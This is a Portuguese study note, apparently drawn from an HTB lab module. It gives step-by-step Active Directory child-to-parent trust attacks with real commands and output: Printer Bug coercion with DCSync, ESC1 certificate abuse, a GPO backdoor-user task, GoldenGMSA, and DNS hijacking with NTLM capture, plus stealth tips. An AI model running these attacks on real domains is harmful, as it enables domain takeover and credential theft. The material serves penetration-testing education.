```powershell
# Verificar se auditoria de diretório está habilitada
auditpol /get /subcategory:"Directory Service Access"
auditpol /get /subcategory:"Kerberos Authentication Service"
auditpol /get /subcategory:"Kerberos Service Ticket Operations"

# Se desabilitados: eventos não gerados — menor risco de detecção
# Se habilitados: usar técnicas mais furtivas (AES, operações mínimas)
```

---

## Ataques Práticos (HTB)

Esta seção contém ataques documentados no módulo HTB "Active Directory Trust Attacks" (2024), com comandos reais do laboratório. O ambiente de lab usa: **DC02** (Child DC — dev.inlanefreight.ad, 172.16.210.3) e **DC01** (Parent DC — inlanefreight.ad, 172.16.210.99).

---

### Unconstrained Delegation + Printer Bug (Child DC → Parent DC)

**Conceito:** DCs têm Unconstrained Delegation habilitado por padrão. Se um atacante controla o Child DC e força o Parent DC a autenticar nele (via Printer Bug / MS-RPRN), o TGT da machine account do Parent DC (`DC01$`) é capturado no Child DC. Com esse TGT é possível executar DCSync no domínio pai.

**Dois cenários:**
1. Aguardar que um usuário privilegiado autentique no Child DC (passivo)
2. Usar o **Printer Bug** para forçar autenticação ativa do Parent DC para o Child DC

**Fluxo do Printer Bug:**
```
1. Atacante (no Child DC) envia MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx para DC01
2. DC01$ autentica via SMB no DC02 (Child DC) enviando seu TGT (por causa de unconstrained delegation)
3. Atacante extrai o TGT de DC01$ da memória do DC02
4. Com o TGT de DC01$, executa DCSync no domínio pai como DC01$
```

**Passo 1 — Monitorar tickets no Child DC com Rubeus:**
```powershell
# Iniciar monitoramento de TGTs novos a cada 5 segundos
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
# [*] Monitoring every 5 seconds for new TGTs
```

**Passo 2 — Explorar o Printer Bug (SpoolSample) para forçar autenticação do Parent DC:**
```powershell
# Sintaxe: SpoolSample.exe <target server> <capture server>
# target = DC01 (Parent DC que vai autenticar)
# capture = DC02 (Child DC que vai capturar o TGT)
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad

# Output esperado:
# [+] Converted DLL to shellcode
# [+] Executing RDI
# [+] Calling exported function
# TargetServer: \\dc01.inlanefreight.ad, CaptureServer: \\dc02.dev.inlanefreight.ad
# Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

**Passo 3 — Rubeus captura o TGT de DC01$ e renovar o ticket:**
```powershell
# Rubeus exibe o ticket de DC01$@INLANEFREIGHT.AD (Base64)
# Renovar o ticket capturado e injetá-lo na sessão atual:
PS C:\Tools> .\Rubeus.exe renew /ticket:<BASE64_TICKET> /ptt

# Verificar ticket injetado:
klist
```

**Passo 4 — DCSync no domínio pai usando o TGT de DC01$:**
```powershell
# Com o TGT de DC01$ em memória, o DCSync funciona como se fosse o próprio DC do pai
mimikatz# lsadump::dcsync /domain:inlanefreight.ad /user:krbtgt
mimikatz# lsadump::dcsync /domain:inlanefreight.ad /user:Administrator
```

**OPSEC:** O Printer Bug (MS-RPRN) pode ser bloqueado desabilitando o serviço Print Spooler nos DCs. Sem o Printer Bug, pode-se usar PetitPotam (MS-EFSRPC) como alternativa.

---

### Configuration Naming Context (NC) Replication Abuse

**Conceito:** O Configuration NC (`CN=Configuration,DC=inlanefreight,DC=ad`) é replicado para **todos os DCs da floresta** (incluindo child domain DCs). Um atacante com privilégios `NT AUTHORITY\SYSTEM` no Child DC pode ler e modificar a réplica local do Configuration NC, e as mudanças propagam de volta ao Parent DC via replicação AD.

O `NT AUTHORITY\SYSTEM` tem **Full Control** sobre o Configuration NC, enquanto Domain Admins do domínio raiz têm acesso completo e Enterprise Admins também.

**Verificar ACLs do Configuration NC:**
```powershell
PS C:\Users\Administrator> $dn = "CN=Configuration,DC=INLANEFREIGHT,DC=AD"
PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write"}

# Resultado relevante:
# ActiveDirectoryRights : GenericAll
# IdentityReference     : NT AUTHORITY\SYSTEM
# ActiveDirectoryRights : GenericAll
# IdentityReference     : INLANEFREIGHT\Enterprise Admins
```

**Abuso possível a partir do Configuration NC como SYSTEM no Child DC:**
- Criar Certificate Templates vulneráveis (ESC1) e publicá-los na CA do domínio pai
- Manipular GPOs em nível de site (GPO On Site Attack)
- Modificar entradas DNS do domínio pai
- Executar ataques GoldenGMSA computando senhas de gMSA do domínio pai

---

### ADCS via Configuration NC (Child → Parent, ESC1)

**Contexto:** Como SYSTEM no Child DC, é possível criar um Certificate Template vulnerável a ESC1 dentro do Configuration NC (réplica local), que replica para o domínio pai. Em seguida, publica-se o template na CA do pai e solicita-se um certificado como qualquer usuário (incluindo `inlanefreight\Administrator`).

**Simplificação do ataque:**
1. Criar Certificate Template vulnerável a ESC1 no Certificate Templates container
2. Dar ao Administrator do child domain Full Control sobre o template criado
3. Publicar o template na CA via objeto `pKIEnrollmentService` no Enrollment Services container
4. Após replicação, solicitar certificado como `root\Administrator` a partir do child domain

**Passo 1 — Abrir MMC como SYSTEM usando PsExec:**
```powershell
PS C:\Tools> .\PsExec.exe -s -i powershell
PS C:\Windows\system32> mmc
# Adicionar snap-in: Certificate Templates
```

**Passo 2 — Duplicar template "User", habilitar ESC1:**
- Clique com botão direito em "User" → "Duplicate Template"
- Na aba "Subject Name": selecionar "Supply in the request"
- Na aba "Security": dar Full Control ao DEV\Administrator
- Salvar como "Copy of User"

**Passo 3 — Publicar o template na CA (via ADSI Edit como SYSTEM):**
```powershell
# Primeiro: garantir que SYSTEM tem permissão no pKIEnrollmentService
# Abrir adsiedit.msc como SYSTEM, navegar até:
# CN=Public Key Services > CN=Enrollment Services > CN=INLANEFREIGHT-DC01-CA
# Modificar ACL de Public Key Services para que SYSTEM se aplique a descendentes

# Editar o atributo certificateTemplates do objeto pKIEnrollmentService
# Adicionar "Copy of User" à lista
```

**Passo 4 — Solicitar certificado como Administrator do domínio pai:**
```powershell
PS C:\Tools> .\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA `
    /domain:inlanefreight.ad `
    /template:"Copy of User" `
    /altname:INLANEFREIGHT\Administrator

# Output: certificado emitido (cert.pem + chave privada)
```

**Passo 5 — Converter PEM para PFX e obter TGT:**
```bash
# Formatar o PEM (remover quebras de linha extras)
sed -i 's/\s\s\+/\n/g' cert.pem

# Converter para PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# (pressionar Enter sem senha quando solicitado)
```

```powershell
# Solicitar TGT para inlanefreight\Administrator usando o certificado
PS C:\Tools> .\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Administrator /certificate:cert.pfx /ptt

# [+] TGT request successful!
# ServiceName  : krbtgt/inlanefreight.ad
# UserName     : Administrator
# UserRealm    : INLANEFREIGHT.AD
```

---

### GPO On Site Attack (Child → Parent via Configuration NC)

**Conceito:** Como SYSTEM no Child DC, é possível criar uma GPO maliciosa no child domain, ligá-la ao **site de replicação** do Root DC (que está no Configuration NC), e a GPO replica para o Parent DC, onde uma Scheduled Task maliciosa é executada.

**Simplificação:**
1. Criar GPO maliciosa no Child Domain Controller
2. Identificar o replication site do Root DC
3. Vincular a GPO ao Default Replication Site do Root DC como SYSTEM
4. Após replicação, a Scheduled Task executa no Parent DC (ex: criar usuário backdoor)

**Passo 1 — Criar a GPO no child domain:**
```powershell
PS C:\Tools> $gpo = "Backdoor"
PS C:\Tools> New-GPO $gpo
# DisplayName : Backdoor
# DomainName  : dev.INLANEFREIGHT.AD
# Owner       : DEV\Domain Admins
```

**Passo 2 — Adicionar Scheduled Task maliciosa à GPO (usando PowerView v2):**
```powershell
PS C:\Tools> Import-Module .\PowerView_2.ps1
PS C:\Tools> New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' `
    -GPODisplayName "Backdoor" `
    -Command C:\Windows\System32\cmd.exe `
    -CommandArguments "/c net user backdoor B@ckdoor123 /add"

# VERBOSE: Trying to weaponize GPO: {656B8436-38F4-447C-9405-40AC83C34117}
```

**Nota:** A função `New-GPOImmediateTask` está disponível apenas na versão antiga do PowerView (PowerSploit repository). A versão atual do PowerView não inclui essa função.

**Passo 3 — Identificar o site de replicação do Root DC:**
```powershell
PS C:\Tools> Get-ADDomainController -Server inlanefreight.ad | Select ServerObjectDN
# ServerObjectDN
# CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
```

**Passo 4 — Vincular a GPO ao Default Site como SYSTEM:**
```powershell
PS C:\Tools> .\PsExec.exe -s -i powershell.exe
PS C:\Windows\system32> whoami
# nt authority\system

PS C:\Windows\system32> $sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
PS C:\Windows\system32> New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad

# GpoId       : 656B8436-38F4-447C-9405-40AC83C34117
# DisplayName : Backdoor
# Enabled     : True
# Target      : CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
```

**Resultado:** Após replicação, o usuário `backdoor` é criado no Parent DC (inlanefreight.ad). É possível solicitar TGT para esse usuário e escalar privilégios.

```powershell
# Solicitar TGT para o usuário backdoor criado no parent domain
PS C:\Tools> .\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:inlanefreight.ad /ptt
# [+] TGT request successful!
```

**Nota importante:** Resetar a máquina após cada execução de Scheduled Task para evitar quebrar o ambiente de lab.

---

### GoldenGMSA Attack (Child → Parent via Configuration NC)

**Conceito:** Group Managed Service Accounts (gMSA) têm sua senha gerenciada automaticamente pelo AD e rotacionada a cada 30 dias. A senha é derivada de atributos do KDS Root Key object (`msKds-ProvRootKey`). Esses atributos são armazenados no Configuration NC (replicado para todos os DCs da floresta).

Um atacante com SYSTEM no Child DC pode ler a réplica local do Configuration NC para obter os atributos do KDS Root Key e calcular a senha de qualquer gMSA do domínio pai — mesmo sem ter acesso direto ao Parent DC.

**Pré-requisitos para acessar atributos do KDS Root Key:**
- Membership em Enterprise Admins do forest root, OU
- Membership em Domain Admins do forest root, OU
- Acesso ao DC como NT/AUTHORITY SYSTEM (via SYSTEM no child DC, pois Configuration NC é replicado)

**Passo 1 — Abrir PowerShell como SYSTEM no Child DC:**
```powershell
C:\Tools> .\PsExec.exe -s -i powershell
```

**Passo 2 — Enumerar gMSAs no domínio pai (Online Attack):**
```powershell
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad

# sAMAccountName:    svc_devadm$
# objectSid:         S-1-5-21-2879935145-656083549-3766571964-1106
# rootKeyGuid:       ba932c0c-5c34-ce6e-fcb8-d441d116a736
# msds-ManagedPasswordID: AQAAAEtEU0sCAA...
```

**Passo 3 — Computar a senha da gMSA (Online — ferramenta busca atributos automaticamente):**
```powershell
PS C:\Tools> .\GoldenGMSA.exe compute `
    --sid "S-1-5-21-2879935145-656083549-3766571964-1106" `
    --forest dev.inlanefreight.ad `
    --domain inlanefreight.ad

# Base64 Encoded Password: WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+...
```

**Passo 3 (alternativo) — Offline Attack (sem acesso de rede ao parent domain):**
```powershell
# Obter msds-ManagedPasswordID do parent domain
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad

# Obter KDS key do child domain como SYSTEM
PS C:\Tools> .\GoldenGMSA.exe kdsinfo --forest dev.inlanefreight.ad
# Guid: ba932c0c-5c34-ce6e-fcb8-d441d116a736
# Base64 blob: AQAAAAwsk7o0XG7O/...

# Calcular senha manualmente com os dois valores
PS C:\Tools> .\GoldenGMSA.exe compute `
    --sid "S-1-5-21-2879935145-656083549-3766571964-1106" `
    --kdskey <BASE64_KDS_KEY> `
    --pwdid <MSDS_MANAGEDPASSWORDID>

# Base64 Encoded Password: WITSKRtGahQFvL/...
```

**Passo 4 — Converter a senha Base64 para NT Hash (Python):**
```python
# Método 1: usando hashlib (requer OpenSSL com suporte a MD4)
import hashlib
import base64
base64_input = "WITSKRtGahQFvL/..."
print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())

# Método 2: usando pycryptodome (recomendado — sem dependência de OpenSSL legado)
from Crypto.Hash import MD4
import base64
base64_input = "WITSKRtGahQFvL/..."
print(MD4.new(base64.b64decode(base64_input)).hexdigest())
```

```bash
python3 convert-to-nt.py
# 32ac66cd327aa76b3f1ca6eb82a801c5
```

**Passo 5 — Solicitar TGT para a gMSA usando o NT hash:**
```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:inlanefreight.ad /ptt

# [+] TGT request successful!
# UserName : svc_devadm$
# UserRealm: INLANEFREIGHT.AD
```

---

### DNS Trust Attack (Child → Parent via SYSTEM + Configuration NC)

**Conceito:** Enterprise Domain Controllers (EDCs) têm privilégios sobre os containers DNS do Active Directory. Com SYSTEM no Child DC, é possível criar, modificar e deletar registros DNS do domínio pai a partir do child DC. Os registros DNS são armazenados em três locais no AD:

1. **DomainDnsZones partition**: `CN=MicrosoftDNS,DC=DomainDnsZones,DC=root,DC=local`
2. **ForestDnsZones partition**: `CN=MicrosoftDNS,DC=ForestDnsZones,DC=root,DC=local`
3. **Domain partition**: `CN=MicrosoftDNS,CN=System,DC=root,DC=local`

**Ataques possíveis:**
- **DNS Wildcard Injection**: criar registro wildcard (`*`) no parent domain apontando para o Child DC — todos os hostnames inexistentes resolvem para o atacante
- **Arbitrary DNS Record Modification**: modificar registros DNS existentes no parent domain para redirecionar tráfego (ex: `DEV01.inlanefreight.ad` → IP do Child DC) e capturar hashes NTLM com Inveigh

#### DNS Wildcard Injection

**Passo 1 — Verificar que o hostname não existe (antes do ataque):**
```powershell
PS C:\Tools> Resolve-DNSName TEST1.inlanefreight.ad
# DNS name does not exist
```

**Passo 2 — Abrir PowerShell como SYSTEM e injetar wildcard usando Powermad:**
```powershell
# Abrir PowerShell como SYSTEM
C:\Tools> .\PsExec.exe -s -i powershell

# Importar Powermad e criar wildcard DNS record no parent domain
PS C:\Tools> Import-module .\Powermad.ps1
PS C:\Tools> New-ADIDNSNode -Node * `
    -domainController DC01.inlanefreight.ad `
    -Domain inlanefreight.ad `
    -Zone inlanefreight.ad `
    -Tombstone -Verbose

# VERBOSE: [+] Distinguished Name = DC=*,DC=inlanefreight.ad,CN=MicrosoftDNS,DC=DomainDNSZones,DC=inlanefreight,DC=ad
# VERBOSE: [+] Data = 172.16.210.3
# [+] ADIDNS node * added
```

**Nota:** `-Tombstone` permite que qualquer usuário autenticado altere ou remova o registro. O IP padrão é o IP de origem (Child DC).

**Passo 3 — Verificar que qualquer hostname inexistente resolve para o Child DC:**
```powershell
PS C:\Tools> Resolve-DNSName TEST2.inlanefreight.ad
# TEST2.inlanefreight.ad  A  599  Answer  172.16.210.3

PS C:\Tools> Resolve-DNSName ANYTHING.inlanefreight.ad
# ANYTHING.inlanefreight.ad  A  599  Answer  172.16.210.3
```

#### Arbitrary DNS Record Modification (Redirect + NTLM Capture)

**Cenário:** Modificar o registro DNS de `DEV01.inlanefreight.ad` para apontar para o Child DC e capturar hashes NTLM de usuários que acessam `\\DEV01.INLANEFREIGHT.AD\dev_share`.

**Passo 1 — Enumerar registros DNS do parent domain como SYSTEM:**
```powershell
PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"
# DEV01  A  1  00:01:00  172.16.210.7
```

**Passo 2 — Modificar o registro DNS de DEV01 (Child DC → 172.16.210.3, TTL=1s):**
```powershell
PS C:\Tools> $Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
PS C:\Tools> $New = $Old.Clone()
PS C:\Tools> $TTL = [System.TimeSpan]::FromSeconds(1)
PS C:\Tools> $New.TimeToLive = $TTL
PS C:\Tools> $New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
PS C:\Tools> Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old `
    -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad

# Verificar mudança:
PS C:\Tools> Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.INLANEFREIGHT.AD
# DEV01.inlanefreight.ad  A  599  Answer  172.16.210.3
```

**Passo 3 — Iniciar Inveigh no Child DC para capturar hashes NTLM:**
```powershell
PS C:\Tools> Import-Module .\Inveigh.ps1
PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

# [*] Inveigh 1.506 started
# [+] Elevated Privilege Mode = Enabled
# [+] Primary IP Address = 172.16.210.3
# [+] DNS Spoofer = Enabled
# [+] SMB Capture = Enabled
```

**Resultado:** Quando usuários tentam acessar `\\DEV01.INLANEFREIGHT.AD\dev_share`, são redirecionados para o Child DC (172.16.210.3) e o Inveigh captura os hashes NTLM. Esses hashes podem ser craqueados offline ou usados em ataques Pass-the-Hash / NTLM Relay.

---

### Adalanche — Ferramenta de Visualização de Trusts

O **Adalanche** é uma alternativa ao BloodHound para coleta e visualização de dados de AD. Usa um único binário e abre automaticamente um visualizador web na porta 8080.

```powershell
# Coletar dados do domínio principal
PS C:\Tools> .\Adalanche.exe collect activedirectory --domain inlanefreight.ad

# Repetir para os outros domínios (logistics.ad, child, etc.)
PS C:\Tools> .\Adalanche.exe collect activedirectory --domain logistics.ad

# Abrir o visualizador
PS C:\Tools> .\Adalanche.exe analyze
# Browser abre em http://127.0.0.1:8080
```

**Query LDAP no visualizador para ver todos os trusts:**
```
(objectClass=trustedDomain)
```
Inserir como "Start Query" e "Middle Query" para visualizar todos os trusts possíveis entre os domínios coletados.

---

## Módulos Relacionados

`05_delegacao_unconstrained.md` cobre Unconstrained Delegation, que pode capturar TGT de DC que se autentica cross-domain. `06_delegacao_constrained_e_rbcd.md` aprofunda cenários onde RBCD funciona cross-domain. `08_bloodhound_e_enumeracao.md` mapeia graficamente todos os trusts e caminhos cross-domain. `03_golden_e_silver_tickets.md` é pré-requisito porque ExtraSIDs attack depende de criação de Golden Ticket. `04_dcsync_e_dominancia.md` cobre a extração do krbtgt hash, passo obrigatório no child-to-parent escalation. `02_kerberoasting_e_asrep.md` é relevante porque em trust bidirecional dá pra Kerberoast service accounts do domínio remoto.

### Ferramentas Relevantes

| Ferramenta | Uso | Plataforma |
|---|---|---|
| Mimikatz kerberos::golden /sids | Golden Ticket com ExtraSIDs | Windows |
| Mimikatz lsadump::trust | Extrair trust keys | Windows |
| Rubeus golden | Golden Ticket | Windows |
| Impacket ticketer | Golden Ticket com ExtraSIDs | Linux |
| PowerView Get-DomainTrust | Enumerar trusts | Windows |
| SharpHound --SearchForest | Coleta cross-domain | Windows |
| nltest | Enumerar trusts (nativo) | Windows |
| bloodhound-python | Coleta cross-domain | Linux |

### Referências Externas

- Sean Metcalf (adsecurity.org) — "Active Directory Kerberos Across Domains and Forests"
- Will Schroeder — "A Guide to Attacking Domain Trusts"
- Microsoft — "How Domain and Forest Trusts Work" (docs.microsoft.com)
- Benjamin Delpy (gentilkiwi) — Mimikatz ExtraSIDs research
- MITRE ATT&CK T1482 — Domain Trust Discovery
- MITRE ATT&CK T1134.005 — SID-History Injection
- Andy Robbins (@_wald0) — BloodHound and Domain Trust Enumeration
